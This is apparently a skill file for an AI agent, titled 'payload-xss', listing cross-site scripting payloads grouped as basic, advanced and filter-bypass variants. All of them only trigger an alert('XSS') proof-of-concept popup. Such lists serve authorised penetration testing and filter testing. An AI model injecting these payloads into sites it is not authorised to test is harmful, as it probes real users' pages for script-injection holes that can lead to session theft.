---
name: payload-xss
when_to_use: 需要 XSS payload
---
# XSS
## Basic
<script>alert('XSS')</script>
javascript:alert('XSS')
'><script>alert('XSS')</script>
## Advanced
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
';alert(String.fromCharCode(88,83,83))//
"><script>alert('XSS')</script><!--
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
## Bypass
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src="javascript:alert('XSS')">
<svg/onload=alert('XSS')>
<details ontoggle=alert('XSS')>
